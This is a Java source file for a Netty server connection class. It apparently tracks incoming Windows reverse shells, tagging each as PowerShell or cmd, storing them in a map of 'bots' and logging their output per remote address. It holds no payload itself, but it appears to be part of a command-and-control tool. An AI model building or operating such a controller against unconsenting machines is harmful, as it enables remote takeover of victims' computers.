package netty.server;

import io.netty.channel.ChannelHandlerContext;
import lombok.Getter;
import lombok.Setter;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;

@Getter
@Setter
public class Connection {
    private int id;
    private boolean alive = true;
    private ChannelHandlerContext ctx;
    private PrintWriter printWriter;
    private boolean printOutput = false;
    private boolean blockOutput = false;
    //private int numberOfBlockedMsg = -1;
    private boolean saveOutput;
    private SystemType.type systemType = SystemType.type.Windows;
    private ShellType.type shellType = null;

    public Connection(ChannelHandlerContext ctx, int id, boolean saveOutput) throws IOException {
        this.ctx = ctx;
        this.saveOutput = saveOutput;
        if(this.saveOutput){
            String fileName = "logs/" + ((ctx.channel().remoteAddress().toString() + ".txt").substring(1));
            this.printWriter = new PrintWriter(new FileWriter(fileName));
        }
        this.id = id;
    }

    public void send(String msg) throws UnsupportedEncodingException, InterruptedException {
        this.ctx.channel().writeAndFlush(msg);
    }

    public void write(String msg) {

        if(shellType == null){
            if(msg.charAt(0) == 'p'){
                shellType = ShellType.type.powershell;
                Data.bots.put(ctx.channel().remoteAddress().toString(), this);
                //System.out.println("added");
            }else if(msg.charAt(0) == 'c'){
                shellType = ShellType.type.cmd;
                Data.bots.put(ctx.channel().remoteAddress().toString(), this);
                //System.out.println("added");
            }else{
                //shellType = ShellType.type.Undefined;
            }

        }

        /*if (blockOutput) {
            if (msg.charAt(msg.length() - 2) == (char) 0xff) {
                System.out.println("Done!");
                blockOutput = false;
            }else {
                return;
            }
        }*/

        if(printOutput){
            try {
                System.out.println(msg);
            } catch (Exception ignored) {
            }
        }

        if(saveOutput){
            this.printWriter.write(msg);
            this.printWriter.flush();
        }
    }


    public void showInfo() {
        System.out.println(ctx.channel().remoteAddress());
    }

    private byte[] convertUtfToWindows(String msg) throws UnsupportedEncodingException {
        byte[] originalBytes = msg.getBytes("Windows-1256"); // Here the sequence of bytes representing the UTF-8 encoded string
        byte[] newBytes = new String(originalBytes, "UTF8").getBytes("Windows-1256");

        /*for(int i=0; i<newBytes.length; i++){
            if(newBytes[i] == (byte)0x22){
                newBytes[i] = (byte)0x92;
            }
        }*/
        //return newBytes;
        return originalBytes;
    }
}
